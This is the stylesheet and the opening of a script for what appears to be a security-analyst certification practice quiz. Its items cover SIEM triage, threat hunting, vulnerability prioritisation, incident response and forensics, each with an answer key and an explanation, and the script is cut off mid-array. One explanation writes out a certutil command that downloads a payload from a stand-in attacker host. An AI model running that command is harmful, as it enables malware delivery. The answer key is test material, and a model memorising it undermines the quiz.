<style>
:root{
  --bg:#f8fafb;--bg2:#fff;--bg3:#f1f3f7;--bg4:#e8ecf2;
  --bd:#e2e8f0;--bd2:#cbd5e1;
  --tx:#0f172a;--tx2:#334155;--tx3:#64748b;--tx4:#94a3b8;
  --cy:#0891b2;--cy0:rgba(8,145,178,.1);
  --gn:#059669;--gn0:rgba(5,150,105,.1);
  --pk:#db2777;--pk0:rgba(219,39,119,.1);
  --ye:#d97706;--ye0:rgba(217,119,6,.1);
  --pu:#7c3aed;--pu0:rgba(124,58,237,.1);
  --or:#ea580c;--or0:rgba(234,88,12,.1);
  --rd:#dc2626;--rd0:rgba(220,38,38,.1);
  --shadow:0 1px 3px rgba(0,0,0,.08);
  --radius:14px;--radius-sm:10px;
  --btn-s-bg:#f1f5f9;
}
[data-theme="dark"]{
  --bg:#0f1117;--bg2:#161b25;--bg3:#1c2333;--bg4:#222c3c;
  --bd:#1e2a3a;--bd2:#2a3a50;
  --tx:#e8edf5;--tx2:#a0aec0;--tx3:#6b7db3;--tx4:#3d4f6b;
  --cy:#38bdf8;--cy0:rgba(56,189,248,.1);
  --gn:#34d399;--gn0:rgba(52,211,153,.1);
  --pk:#f472b6;--pk0:rgba(244,114,182,.1);
  --ye:#fbbf24;--ye0:rgba(251,191,36,.1);
  --pu:#a78bfa;--pu0:rgba(167,139,250,.1);
  --or:#fb923c;--or0:rgba(251,146,60,.1);
  --rd:#ef4444;--rd0:rgba(239,68,68,.1);
  --btn-s-bg:#1c2333;
}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'DM Sans',sans-serif;background:var(--bg);color:var(--tx);min-height:100vh;transition:background .3s,color .3s}
.app{display:flex;min-height:100vh}
.rail{width:220px;background:var(--bg2);border-right:1px solid var(--bd);display:flex;flex-direction:column;padding:16px;position:fixed;height:100vh;z-index:100}
.rail-logo{font-family:Syne,sans-serif;font-size:17px;font-weight:800;color:var(--cy);margin-bottom:2px;padding:8px}
.rail-sub{font-size:11px;color:var(--tx3);padding:0 8px 16px;border-bottom:1px solid var(--bd)}
.rail-nav{display:flex;flex-direction:column;gap:4px;margin-top:12px;flex:1}
.nav-btn{display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:10px;border:none;background:none;cursor:pointer;font-family:inherit;font-size:13px;font-weight:500;color:var(--tx3);width:100%;text-align:left;transition:all .15s}
.nav-btn:hover{background:var(--bg3);color:var(--tx)}
.nav-btn.active{background:var(--cy0);color:var(--cy);font-weight:700}
.nav-icon{font-size:16px;width:20px;text-align:center}
.rail-footer{border-top:1px solid var(--bd);padding-top:12px;margin-top:auto}
.main{margin-left:220px;flex:1}
.pg{padding:24px;max-width:1000px;margin:0 auto}
.card{background:var(--bg2);border:1px solid var(--bd);border-radius:var(--radius);padding:20px;box-shadow:var(--shadow)}
.card2{background:linear-gradient(135deg,var(--cy0),rgba(124,58,237,.08));border:1px solid rgba(8,145,178,.2);border-radius:var(--radius);padding:20px;box-shadow:var(--shadow)}
.btn{padding:10px 18px;border-radius:var(--radius-sm);border:none;cursor:pointer;font-family:Syne,sans-serif;font-size:13px;font-weight:700;transition:all .15s;display:inline-flex;align-items:center;gap:6px}
.btn-p{background:linear-gradient(135deg,var(--cy),var(--pu));color:#fff}
.btn-p:hover{opacity:.9;transform:translateY(-1px)}
.btn-s{background:var(--btn-s-bg);border:1px solid var(--bd2);color:var(--tx)}
.btn-s:hover{border-color:var(--cy);color:var(--cy)}
.btn-full{width:100%;justify-content:center}
.stitle{font-size:13px;font-weight:700;color:var(--tx3);text-transform:uppercase;letter-spacing:.5px;margin-bottom:12px;border:none;padding:0;background:none;display:block}
.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px}
.stat-card{background:var(--bg2);border:1px solid var(--bd);border-radius:var(--radius);padding:16px;text-align:center}
.stat-num{font-family:Syne,sans-serif;font-size:28px;font-weight:800;color:var(--cy)}
.stat-label{font-size:11px;color:var(--tx3);margin-top:2px}
.ans{display:flex;align-items:flex-start;gap:12px;padding:12px 14px;border-radius:var(--radius-sm);border:1.5px solid var(--bd2);background:var(--bg2);cursor:pointer;margin-bottom:8px;transition:all .15s;font-size:14px;line-height:1.5;color:var(--tx2);text-align:left;width:100%;font-family:inherit}
.ans:hover{border-color:var(--cy);background:var(--cy0)}
.ans.sel{border-color:var(--cy);background:var(--cy0);color:var(--cy)}
.ans.hit{border-color:var(--gn);background:var(--gn0);color:var(--gn)}
.ans.miss{border-color:var(--rd);background:var(--rd0);color:var(--rd)}
.ans.dim{opacity:.5}
.ltr{width:26px;height:26px;border-radius:7px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;flex-shrink:0;background:var(--bg3);color:var(--tx3)}
.ans.sel .ltr{background:var(--cy0);color:var(--cy)}
.ans.hit .ltr{background:var(--gn0);color:var(--gn)}
.ans.miss .ltr{background:var(--rd0);color:var(--rd)}
.prog-bar{height:6px;background:var(--bg4);border-radius:3px;overflow:hidden;margin-bottom:6px}
.prog-fill{height:100%;border-radius:3px;transition:width .3s;background:linear-gradient(90deg,var(--cy),var(--pu))}
.fc{perspective:1200px;-webkit-perspective:1200px;cursor:pointer;margin-bottom:16px}
.fc-inner{transition:transform .35s cubic-bezier(.4,.2,.2,1);transform-style:preserve-3d;-webkit-transform-style:preserve-3d;position:relative;min-height:200px;width:100%;will-change:transform}
.fc.flipped .fc-inner{transform:rotateY(180deg)}
.fc-front,.fc-back{position:absolute;width:100%;height:100%;min-height:200px;backface-visibility:hidden;-webkit-backface-visibility:hidden;border-radius:var(--radius);border:1px solid var(--bd);padding:24px;display:flex;align-items:center;justify-content:center}
.fc-front{background:var(--bg2)}
.fc-back{background:var(--gn0);border-color:var(--gn);transform:rotateY(180deg)}
#toast-wrap{position:fixed;top:20px;right:20px;z-index:9999;display:flex;flex-direction:column;gap:8px;pointer-events:none}
.toast-msg{background:var(--tx);color:var(--bg);padding:10px 16px;border-radius:10px;font-size:13px;font-weight:600;animation:slideIn .3s ease;pointer-events:none}
@keyframes slideIn{from{transform:translateX(100px);opacity:0}to{transform:translateX(0);opacity:1}}
.bnav{display:none;position:fixed;bottom:0;left:0;right:0;background:var(--bg2);border-top:1px solid var(--bd);padding:8px;z-index:100;grid-template-columns:repeat(5,1fr)}
.bnav-btn{display:flex;flex-direction:column;align-items:center;gap:2px;padding:6px;border:none;background:none;cursor:pointer;font-size:10px;font-weight:600;color:var(--tx3);font-family:inherit}
.bnav-btn.active{color:var(--cy)}
.row{display:flex;align-items:center;gap:8px}
.exam-bar{position:sticky;top:0;z-index:50;background:var(--bg2);border-bottom:1px solid var(--bd);padding:10px 20px}
@media(max-width:768px){.rail{display:none}.main{margin-left:0;padding-bottom:70px}.bnav{display:grid}.stats-grid{grid-template-columns:repeat(2,1fr)}.pg{padding:14px}}
@media(max-width:480px){.btn{padding:8px 12px;font-size:12px}}
</style>

<script>
const QZ=[
{q:"A SIEM alert fires for 500 failed logins across 200 different accounts from one external IP in 10 minutes. The analyst's FIRST action is:",o:["Block the source IP immediately", "Classify as a password spray attack — notify account owners and escalate", "Ignore — probably a scanner", "Reset all 200 accounts"],a:1,d:1,e:"Password spray attacks try a few common passwords against many accounts to avoid lockout. The pattern (many accounts, few attempts each, one source IP) is the signature. First action: classify and escalate. Blocking the IP is reasonable but secondary — the analyst must first confirm and communicate."},
{q:"Which log source would BEST help an analyst determine whether a phishing email was actually opened and a link clicked?",o:["Firewall logs", "Email gateway logs combined with DNS/proxy logs showing the destination URL was resolved", "Authentication logs", "DHCP logs"],a:1,d:1,e:"Email gateway logs show delivery and open events. DNS/proxy logs show whether the phishing URL was resolved or visited after the email arrived. Correlation of both confirms the full chain: email delivered → link clicked → destination contacted. This is the analyst's primary evidence chain for phishing triage."},
{q:"An analyst reviewing Windows event logs sees Event ID 4688 with process name 'powershell.exe' and parent process 'winword.exe'. This MOST likely indicates:",o:["Normal macro execution", "A macro-based malware attack — Word spawning PowerShell is a classic malicious macro indicator", "Scheduled task execution", "Normal IT administration"],a:1,d:1,e:"Word (winword.exe) should never spawn PowerShell as a child process in legitimate business use. This parent-child relationship is a high-fidelity indicator of macro-based malware — the Word document contained a malicious macro that launched PowerShell. Event ID 4688 (Process Creation) with parent tracking is critical for detecting this."},
{q:"Which SIEM use case detects an attacker using legitimate admin tools to move laterally after initial compromise?",o:["Signature-based malware detection", "Living-off-the-land (LOTL) detection — flagging use of built-in tools (PsExec, WMI, PowerShell) in unusual contexts", "DDoS detection", "Phishing email detection"],a:1,d:1,e:"Living-off-the-land attacks use legitimate built-in tools (PsExec, WMI, WMIC, PowerShell, certutil) to avoid malware detection. SIEM rules detecting unusual use of these tools — non-admin users running PsExec, PowerShell with encoded commands, WMI remote execution — catch this technique. Signature-based AV misses these entirely."},
{q:"A SOC analyst receives an alert: 'Outbound HTTPS connection to a newly registered domain (3 days old) from a server that normally only accepts inbound connections.' The analyst should:",o:["Close as false positive — HTTPS is encrypted and safe", "Investigate as high-priority — servers initiating outbound connections to new domains is anomalous and suggests C2 communication", "Notify the server owner", "Block the domain at the firewall without investigation"],a:1,d:1,e:"Servers (not workstations) initiating outbound connections is already anomalous. Connecting to a brand-new domain compounds suspicion — attackers register new domains specifically to avoid blocklists. This pattern (server → new domain, HTTPS for C2 encryption) is a high-confidence C2 indicator requiring immediate investigation."},
{q:"Which tool provides the BEST visibility into east-west (lateral) traffic between internal network segments?",o:["Perimeter firewall logs", "Internal network taps/spans or network detection and response (NDR) on internal segments", "External IDS only", "DHCP server logs"],a:1,d:1,e:"Perimeter firewalls see north-south (in/out) traffic but miss internal lateral movement. NDR deployed on internal segments captures server-to-server traffic. After initial compromise, attackers move laterally — without internal visibility, this movement is completely invisible. Internal network monitoring is essential for detecting post-compromise lateral movement."},
{q:"An analyst sees repeated DNS TXT record queries of 40-60 characters to subdomains of a single external domain from one internal host. This MOST likely indicates:",o:["Normal application behavior", "DNS tunneling — encoding data in DNS queries for C2 or exfiltration", "CDN health checks", "DNSSEC validation"],a:1,d:1,e:"DNS tunneling encodes data in query/response strings. Long random-looking subdomains, high query frequency to one parent domain, TXT record queries (which carry arbitrary data), and the pattern matching 'base64-encoded chunks' all indicate DNS tunneling. The host likely has malware using DNS as a covert channel to bypass firewall rules."},
{q:"Which artifact from an endpoint is MOST valuable for determining what happened immediately before a system was rebooted?",o:["System event logs", "Volatile memory (RAM) dump captured before reboot — contains running processes, network connections, encryption keys", "Hard disk image", "Registry hive"],a:1,d:1,e:"RAM contains volatile evidence lost on reboot: running processes (including malware with no disk footprint), active network connections (C2 channels), decrypted data (ransomware keys, credentials), and injected code. For incident response, capturing RAM before reboot preserves the most time-sensitive evidence. Hard disk imaging comes after."},
{q:"A threat hunter develops a hypothesis: 'An attacker may be using certutil.exe to download malware.' Which data source BEST tests this hypothesis?",o:["Antivirus logs", "Process creation logs (Event ID 4688 or EDR telemetry) showing certutil.exe with URL arguments", "Network firewall logs", "Email gateway logs"],a:1,d:1,e:"certutil.exe is a legitimate Windows certificate utility that attackers abuse for downloading files: 'certutil -urlcache -split -f http://attacker.com/payload.exe'. Process creation logs with command-line arguments (enabled via audit policy or EDR) show exactly what arguments certutil ran. This is the primary data source for this specific hunting hypothesis."},
{q:"Which technique does an attacker use to establish persistence that survives a system reboot without dropping executable files to disk?",o:["Registry run keys", "WMI event subscriptions — triggers execute code when WMI events fire, surviving reboots, often missed by AV", "Scheduled tasks", "Service installation"],a:1,d:1,e:"WMI event subscriptions (WMI-based persistence) create an event filter paired with an event consumer. When the trigger fires (e.g., system startup), the consumer executes code — often a PowerShell command downloaded from the internet rather than stored on disk. This fileless persistence evades many endpoint controls and is difficult to detect without WMI audit logging."},
{q:"Which threat intelligence framework categorizes indicators by their 'pain level' for attackers if defenders detect and block them?",o:["MITRE ATT&CK", "Pyramid of Pain — from easy-to-change hash values at bottom to hard-to-change TTPs at top", "Diamond Model", "Kill chain"],a:1,d:1,e:"Pyramid of Pain (David Bianco): Hash values (trivial to change) → IP addresses → Domain names → Network artifacts → Host artifacts → Tools → TTPs (very hard to change). Detecting TTPs causes the most pain because the attacker must fundamentally change how they operate. Blocking hashes only forces a recompile. Focus defensive energy on TTP-level detection."},
{q:"An analyst receives a threat intelligence report containing STIX indicators. To automatically consume and act on these indicators in security tools, which protocol should be used?",o:["HTTP REST API", "TAXII — the transport protocol for sharing STIX threat intelligence between systems", "SNMP", "Syslog"],a:1,d:1,e:"STIX (Structured Threat Information eXpression) is the format for describing threat intelligence. TAXII (Trusted Automated eXchange of Intelligence Information) is the transport protocol for sharing STIX data between organizations and tools. Together they enable automated threat intelligence sharing. MISP and other TIPs implement TAXII servers for distributing indicators."},
{q:"Which type of threat intelligence is MOST actionable for an analyst blocking indicators at the firewall today?",o:["Strategic intelligence (geopolitical threat landscape)", "Tactical intelligence — specific IoCs like malicious IPs, domains, and file hashes that can be immediately blocked", "Operational intelligence (attacker campaigns)", "Technical intelligence (malware code analysis)"],a:1,d:1,e:"Tactical intelligence provides immediately usable indicators: IP addresses to block, domains to sinkhole, file hashes for EDR rules. Strategic intelligence informs executive decisions. Operational intelligence helps understand campaigns. Technical intelligence supports malware analysis. For same-day defensive action, tactical IoCs are what analysts implement directly in security tools."},
{q:"The Diamond Model of intrusion analysis organizes incidents around four features. Which feature describes the tools and techniques used?",o:["Adversary", "Infrastructure", "Capability — the tools, malware, and techniques used by the attacker", "Victim"],a:2,d:1,e:"Diamond Model: Adversary (threat actor) ↔ Capability (tools/techniques) ↔ Infrastructure (IP addresses, domains, servers) ↔ Victim (target). Analysts use the model to pivot between features — a known capability links to known infrastructure which links to the adversary. This structured approach enables better attribution and intelligence sharing."},
{q:"An analyst identifies that an attacker used a zero-day exploit. On the Pyramid of Pain, this is best classified as which indicator type?",o:["Hash value — easy to change", "TTPs (tactics, techniques, and procedures) — hardest to change and most valuable to detect", "Domain name — moderate difficulty", "IP address — easy to change"],a:1,d:1,e:"A zero-day exploit represents a specific technique used by the attacker. Techniques are near the top of the Pyramid of Pain — detecting the technique (exploiting a specific vulnerability in a specific way) provides the most durable detection. Even if the attacker fixes or changes their tool, the underlying TTP (exploiting that vulnerability class) may remain consistent."},
{q:"Which SIEM capability reduces analyst workload by automatically grouping multiple related alerts into a single investigation case?",o:["Log normalization", "Alert correlation and case management — grouping related alerts reduces alert fatigue", "Log retention", "User behavior analytics"],a:1,d:1,e:"Alert grouping/correlation reduces alert fatigue by combining related events. Instead of 50 alerts about the same attack, the SIEM creates one case with all related evidence. SOAR platforms extend this with automated enrichment and response. The goal is giving analysts fewer, higher-quality investigations rather than drowning them in individual alerts."},
{q:"An EDR agent records a process injecting code into a legitimate Windows process (lsass.exe). This technique is called:",o:["Pass-the-hash", "Process injection — injecting malicious code into a legitimate process to hide and inherit its privileges", "DLL hijacking", "Privilege escalation"],a:1,d:1,e:"Process injection injects malicious code into legitimate processes. Injecting into lsass.exe is particularly dangerous — lsass runs as SYSTEM, and Mimikatz injects into lsass to dump credentials. EDR telemetry capturing process injection events (via API hooking or kernel sensors) is essential for detecting this stealthy technique that security software typically runs inside."},
{q:"Which Windows artifact records the last time an application was run on a system, useful for proving execution of malware even if the file was deleted?",o:["Windows Registry Run keys", "Prefetch files (.pf in C:\\Windows\\Prefetch) — record execution time and file references", "Event logs", "Browser history"],a:1,d:1,e:"Windows Prefetch caches information about recently run applications: executable name, run count, last run time (up to 8 run times in Win10+), and files referenced during execution. Forensically, Prefetch proves a program ran even after deletion. Attackers sometimes disable Prefetch or delete .pf files — its absence can itself be suspicious on a system where it was previously enabled."},
{q:"A user reports their account was used to send mass phishing emails overnight while they were asleep. Which log source FIRST confirms whether the account was legitimately or maliciously accessed?",o:["Email content logs", "Authentication logs showing the source IP, geography, and method used for the login that sent the emails", "Firewall logs", "DNS logs"],a:1,d:1,e:"Authentication logs show: who logged in, from where (IP → geolocation), when, and how (password? MFA? which MFA method?). If the overnight login came from a foreign IP or different device than the user's normal profile, it confirms account compromise. Email logs show what was sent; auth logs prove who (or what) sent it."},
{q:"Which network security monitoring technique captures full packet data including payload for deep forensic analysis?",o:["NetFlow/IPFIX — metadata only", "Full packet capture (PCAP) — records complete packet contents including payload", "IDS signatures", "Firewall logs"],a:1,d:1,e:"PCAP captures complete packet data — headers and payload — enabling full session reconstruction, payload analysis, and evidence of data exfiltrated. NetFlow captures metadata only (who talked to whom, when, how much). PCAP is storage-intensive but provides the richest forensic evidence. Security teams typically capture PCAP on segments of interest rather than everywhere."},
{q:"An analyst receives vulnerability scan results showing a CVSS 9.8 critical vulnerability on an internal server with no internet exposure, and a CVSS 7.0 high on an internet-facing payment server. Which should be patched FIRST?",o:["The CVSS 9.8 — higher score always means higher priority", "The CVSS 7.0 on the internet-facing payment server — asset exposure and context make it higher actual risk", "Both simultaneously", "Neither — escalate to management"],a:1,d:2,e:"CVSS measures technical severity, not actual risk. The internet-facing payment server is directly reachable by attackers worldwide and handles sensitive financial data. The internal server with no internet exposure has limited attack paths. Risk = Severity × Likelihood × Impact. Context (exposure, asset value, exploitability) must modify raw CVSS scores for meaningful prioritization."},
{q:"Which vulnerability management metric measures the time from public CVE disclosure to patch deployment in an organization?",o:["Mean Time to Detect (MTTD)", "Mean Time to Remediate (MTTR) — time from vulnerability discovery/disclosure to patching", "Vulnerability age", "Patch coverage percentage"],a:1,d:2,e:"MTTR in vulnerability management tracks how quickly vulnerabilities are remediated. The longer MTTR, the larger the window attackers have to exploit known vulnerabilities. Organizations track MTTR by severity — critical vulnerabilities should have MTTR measured in days, not weeks. MTTR trending over time shows whether the patching program is improving."},
{q:"A vulnerability scan shows a web server is running an outdated TLS version (TLS 1.0). The remediation team says it cannot be updated because a legacy application requires TLS 1.0. This is documented as a:",o:["False positive", "Risk acceptance with compensating controls — acknowledging the vulnerability while implementing alternative protections", "False negative", "Patch exception requiring re-scanning"],a:1,d:2,e:"When patching isn't possible, the risk must be formally documented. A risk acceptance records the vulnerability, business justification, compensating controls (e.g., restrict access to TLS 1.0 service to specific known IPs, monitor traffic closely), risk owner's signature, and review date. This creates accountability and ensures the risk isn't forgotten."},
{q:"Which tool is MOST appropriate for identifying misconfigurations in cloud infrastructure resources like exposed S3 buckets and overly permissive IAM roles?",o:["Network vulnerability scanner", "CSPM (Cloud Security Posture Management) tool", "Web application scanner", "Password auditing tool"],a:1,d:2,e:"CSPM tools continuously scan cloud environments for security misconfigurations. They check: public storage bucket access, overpermissive IAM policies, unencrypted data stores, security group rules allowing 0.0.0.0/0, missing logging, and compliance against CIS benchmarks. Traditional network scanners don't understand cloud-specific configurations."},
{q:"An analyst is prioritizing vulnerabilities using CVSS scores. Which CVSS metric specifically indicates whether the vulnerability requires user interaction to exploit?",o:["Attack Vector", "User Interaction (UI) — indicates whether a human must take an action for exploitation to succeed", "Privileges Required", "Scope"],a:1,d:2,e:"CVSS v3 metrics include User Interaction (UI): None means no user action required (wormable, higher severity); Required means a user must click, open, or take action. Vulnerabilities not requiring user interaction are more dangerous — they can be exploited automatically without tricking anyone. This is why browser memory corruption bugs requiring 'click a link' are lower severity than server-side bugs."},
{q:"Which vulnerability management process ensures that reported vulnerabilities are real before spending resources on remediation?",o:["Vulnerability scanning", "Vulnerability validation/confirmation — testing whether the vulnerability is actually exploitable in the specific environment", "Patch management", "Risk scoring"],a:1,d:2,e:"Vulnerability validation (confirmation) tests whether a scan finding is actually exploitable. Scanners produce false positives — a version string indicating an old, vulnerable software version even after the fix was backported. Manual validation (attempting exploitation in a safe way, reviewing actual patch state, code review) confirms real findings before consuming patching resources."},
{q:"A web application vulnerability scan discovers SQL injection in a login form. The MOST effective long-term remediation is:",o:["Deploying a WAF to filter SQL injection attempts", "Fixing the code — using parameterized queries/prepared statements to prevent SQL injection at the source", "Disabling the login form", "Increasing logging on the database"],a:1,d:2,e:"WAFs filter known SQL injection patterns but can be bypassed with obfuscation. Parameterized queries fix the root cause — they separate code from data, so user input is never interpreted as SQL commands. WAFs are a compensating control while code is fixed, not a substitute. Code-level fixes are always preferred over filtering for application vulnerabilities."},
{q:"Which CVSS metric indicates that exploiting the vulnerability gives the attacker control over resources BEYOND the vulnerable component?",o:["Attack Complexity", "Scope: Changed — indicates the vulnerability can impact components beyond the vulnerable component", "Privileges Required", "Confidentiality Impact"],a:1,d:2,e:"Scope: Changed (S:C) in CVSS v3 means the vulnerability can cross trust boundaries and affect other components. Example: a sandbox escape or hypervisor escape affects the host system (beyond the VM). Scope: Changed vulnerabilities receive higher base scores because they represent more dangerous systemic impact."},
{q:"An organization's vulnerability scan shows 2,000 findings. Which approach BEST prioritizes remediation for maximum risk reduction?",o:["Patch by CVSS score, highest first", "Risk-based prioritization: CVSS + CISA KEV status + asset criticality + exploitability evidence — focus on internet-exposed critical assets with active exploits", "Patch oldest vulnerabilities first", "Patch by vendor release date"],a:1,d:2,e:"Risk-based prioritization considers: Is this on CISA's Known Exploited Vulnerabilities list? Is there active exploitation in the wild? Is the asset internet-facing and critical? CVSS alone treats an air-gapped lab server with CVSS 9.8 the same as an internet-facing payment server with CVSS 7.0. Context dramatically changes actual priority."},
{q:"Which scanning technique performs the MOST thorough vulnerability assessment by logging into the target system?",o:["External/unauthenticated scan — simulates attacker perspective", "Credentialed/authenticated scan — uses system credentials to examine installed software versions, configurations, and patch levels", "Passive scan", "Web application scan only"],a:1,d:2,e:"Credentialed scans authenticate to target systems and examine: installed software versions, registry keys, actual patch levels, and configuration settings. They find 5-10x more vulnerabilities than unauthenticated scans which can only see what's exposed on the network. Unauthenticated scans provide the attacker perspective; credentialed scans provide comprehensive internal visibility."},
{q:"An analyst discovers a critical vulnerability was publicly disclosed 90 days ago but has not been patched. The system owner says patching requires a maintenance window that hasn't been scheduled. BEST response:",o:["Accept the risk and wait for the next scheduled window", "Escalate to management — a 90-day unpatched critical vulnerability exceeds acceptable risk tolerance and may require emergency maintenance", "Ignore — the vendor may release another patch", "Submit a change request for the next quarterly window"],a:1,d:2,e:"90 days unpatched on a critical vulnerability is unacceptable. Most ransomware and APT attacks exploit vulnerabilities that have been patched for weeks or months. Escalation to management creates visibility and accountability. If the vulnerability is actively exploited in the wild, emergency patching procedures should override normal change windows."},
{q:"Which process ensures that vulnerability scan results are reviewed to eliminate scanner errors and version-based false positives?",o:["Automated patching", "False positive management and scan result tuning — reviewing and suppressing findings confirmed as non-issues", "Risk acceptance", "Compensating controls"],a:1,d:2,e:"Vulnerability scanners infer vulnerabilities from version strings and installed components, producing false positives when patches are applied without version number changes (common in Linux distributions). Regular review and suppression of confirmed false positives improves signal quality. Suppressed findings should be documented with justification and reviewed periodically."},
{q:"During incident response, an analyst discovers that a threat actor has been in the network for 60 days. Before starting eradication, the analyst must:",o:["Immediately disconnect all network connections", "Fully map the scope of compromise — all affected systems, persistence mechanisms, and lateral movement — to enable complete eradication", "Restore from backup", "Notify law enforcement immediately"],a:1,d:3,e:"Incomplete scoping leads to reinfection. After 60 days, the attacker has had time to establish persistence on many systems through multiple mechanisms. If eradication begins without complete scoping, one missed backdoor allows immediate return. Complete scope mapping — all compromised accounts, all persistence mechanisms, all affected hosts — is required for successful eradication."},
{q:"Which phase of the incident response lifecycle involves capturing and preserving evidence while minimizing disruption?",o:["Preparation", "Detection and Analysis", "Containment — isolating affected systems while preserving forensic evidence", "Recovery"],a:2,d:3,e:"Containment stops spread while preserving evidence. The tension: fully isolating a system prevents evidence collection (memory is volatile); allowing it to run risks spread. Modern IR favors network isolation (disconnect from network while keeping running) to preserve volatile memory evidence. Forensic imaging occurs during containment, before eradication changes the evidence state."},
{q:"A company experiences a ransomware attack. Backups are unavailable because the attackers encrypted them too. The BEST next step is:",o:["Pay the ransom — backups are gone", "Engage a specialized ransomware IR firm to investigate whether decryption is possible without paying, assess the attack scope, and evaluate legal/law enforcement obligations", "Rebuild all systems from scratch immediately", "Notify all customers immediately before assessing the damage"],a:1,d:3,e:"Before paying ransom or making major decisions, engage experts: IR firms may identify decryption keys still in memory, find backups the attackers missed, or know of free decryptors for the specific ransomware variant. Law enforcement notification may be legally required and can access intelligence unavailable to private parties. Acting without expert guidance often makes things worse."},
{q:"Which attack framework maps adversary behavior to specific phases from initial reconnaissance through final objectives?",o:["CVSS scoring system", "MITRE ATT&CK — comprehensive knowledge base of adversary tactics and techniques observed in real attacks", "Kill chain — linear 7-phase model of attack progression", "Diamond Model"],a:2,d:3,e:"Kill chain (Lockheed Martin): Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objectives. It's a linear model useful for understanding attack progression. MITRE ATT&CK is more comprehensive — it maps specific techniques within each tactic and is based on observed real-world attacks. Both are used in IR but ATT&CK provides more operational detail."},
{q:"An analyst identifies malware that connects to a C2 server every 300 seconds. This regular interval is called:",o:["Exfiltration timing", "Beaconing — regular periodic callbacks to C2 infrastructure", "Port scanning", "DGA activity"],a:1,d:3,e:"Beaconing is a signature C2 behavior — malware checking in with its C2 server at regular intervals to receive commands. The regularity creates a detectable statistical pattern in network traffic. Security tools that analyze communication timing can identify beaconing even when the destination varies (e.g., via DGA). Irregular or jittered beaconing is used to evade timing-based detection."},
{q:"During a forensic investigation, an analyst must prove that disk image evidence was not modified during analysis. The BEST method is:",o:["Storing evidence in a secure location", "Generating a cryptographic hash of the original before imaging, and hashing the image after — matching hashes prove integrity", "Using write-protected storage media", "Using licensed forensic software"],a:1,d:3,e:"Forensic integrity is proven through hash verification. SHA-256 hash of the original media before imaging, and hash of the acquired image after — matching hashes cryptographically prove the image is identical to the original and hasn't been modified. This is the foundation of forensic evidence admissibility. Any modification, however minor, changes the hash."},
{q:"A security analyst finds a file named 'svchost.exe' running from 'C:\\Users\\Public\\' instead of 'C:\\Windows\\System32\\'. This MOST likely indicates:",o:["Normal Windows behavior", "Malware masquerading as a legitimate Windows process — legitimate svchost.exe only runs from System32", "A system update", "A software installation"],a:1,d:3,e:"Masquerading (MITRE ATT&CK T1036) involves naming malware after legitimate system processes. Legitimate svchost.exe ONLY runs from C:\\Windows\\System32 (or SysWOW64). Any svchost.exe running from user directories, temp folders, or other locations is malware. Process path verification is a fundamental analyst technique for detecting this common evasion."},
{q:"Which artifact would an analyst examine to determine if a user intentionally copied files to a USB drive?",o:["Network traffic logs", "Windows Registry LNK files, Shellbags, and USB connection artifacts (USBSTOR registry key, SetupAPI logs)", "System event logs only", "Browser history"],a:1,d:3,e:"USB forensics uses multiple artifacts: USBSTOR registry key (records connected USB devices), SetupAPI logs (timestamps when new devices connected), Shellbags (records folders browsed — including USB drive contents), LNK files (shortcuts created when files were accessed), and jump lists. Together these build a timeline of USB usage and what files were accessed."},
{q:"Which containment strategy BEST balances stopping attacker access with preserving forensic evidence?",o:["Immediate power-off of all affected systems", "Network isolation — disconnecting systems from network while keeping them powered on to preserve volatile memory", "Immediately reimaging all affected systems", "Blocking the attacker's source IP only"],a:1,d:3,e:"Network isolation removes the attacker's access path (C2 and lateral movement) while preserving volatile evidence. Powering off destroys RAM (running processes, network connections, encryption keys, injected code). Reimaging destroys all evidence. Blocking the source IP only stops that specific channel — attackers often have multiple persistence mechanisms on different infrastructure."},
{q:"During a tabletop exercise, the team discovers the IR plan doesn't address ransomware attacks on OT systems. This finding should result in:",o:["Noting it as a gap but proceeding", "Updating the IR plan to include OT-specific ransomware playbooks before the next real incident", "Cancelling the exercise", "Immediately purchasing OT security tools"],a:1,d:3,e:"Tabletop exercises exist precisely to find these gaps before real incidents. An IR plan that doesn't cover OT ransomware in an environment with OT systems is a critical gap. The immediate output of a tabletop is an action list of plan updates. This finding should be assigned an owner, given a deadline, and the updated plan retested before being considered complete."},
{q:"A security analyst must brief the board of directors on the organization's current risk posture. The BEST approach is:",o:["Present all technical vulnerability details and CVE numbers", "Translate technical findings into business risk — financial exposure, operational impact, and strategic recommendations", "Present the number of security tools deployed", "Read from the technical vulnerability assessment report"],a:1,d:4,e:"Boards need business context, not technical details. 'We have 47 critical CVEs' means nothing to a board. 'We have 3 exploitable vulnerabilities in our payment system representing potential $2M regulatory fine and 2-week operational disruption' enables informed decisions. Translate risk into terms that matter to business leaders: money, operations, and reputation."},
{q:"Which metric BEST demonstrates that a vulnerability management program is improving over time?",o:["Number of vulnerabilities found", "Mean Time to Remediate (MTTR) trend — decreasing MTTR shows the program is getting faster at closing vulnerabilities", "Number of scans conducted", "Budget spent on vulnerability tools"],a:1,d:4,e:"Trending MTTR over time is the strongest program effectiveness indicator. Finding more vulnerabilities just means scanning more (or having more systems). Remediating faster shows the program is operationally improving. Additional supporting metrics: reduction in critical vulnerability age, improvement in patching SLA compliance rates, and reduction in re-discovered vulnerabilities."},
{q:"After a major security incident, a lessons-learned report should be distributed to:",o:["Only the security team", "All relevant stakeholders including executive leadership, affected business units, IT, legal, and HR — with appropriate detail levels for each audience", "Only executive leadership", "Only the incident responders"],a:1,d:4,e:"Different audiences need different levels of detail. Executives: business impact and strategic improvements. IT/Security: technical root cause and control changes. Business units: process changes affecting them. Legal/HR: if personnel actions or legal obligations resulted. Legal hold considerations may restrict distribution. The report should improve future response — broad distribution with appropriate framing achieves this."},
{q:"A vulnerability analyst discovers a critical finding in a third-party vendor's software used by the organization. The BEST communication approach is:",o:["Immediately publicly disclose the vulnerability", "Follow responsible disclosure — notify the vendor privately with a reasonable remediation timeline before any public disclosure", "Ignore it — it's the vendor's responsibility", "Notify only internal stakeholders"],a:1,d:4,e:"Responsible/coordinated disclosure: notify the vendor first, provide sufficient detail to reproduce and fix, agree on a disclosure timeline (typically 90 days per Google Project Zero standard), coordinate disclosure of a fix simultaneously. Immediate public disclosure before the vendor can patch harms all users of the software. Ignoring it leaves all users at risk."},
